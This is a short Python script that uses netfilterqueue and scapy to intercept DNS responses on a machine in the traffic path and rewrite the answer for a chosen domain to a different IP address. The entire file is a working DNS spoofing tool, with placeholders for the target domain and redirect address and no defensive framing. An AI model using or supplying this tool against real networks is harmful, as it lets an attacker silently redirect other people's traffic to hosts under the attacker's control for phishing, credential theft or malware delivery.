#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert raw packet to Scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):  # Check if the packet has a DNS Response
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # Get the requested domain name
        if "site name " in qname:  # Replace with the target domain
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="victim ip address")  # Fake DNS response
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Remove checksums and lengths to allow Scapy to recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))  # Update the packet payload
    packet.accept()  # Forward the packet


# Bind the queue to the function
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
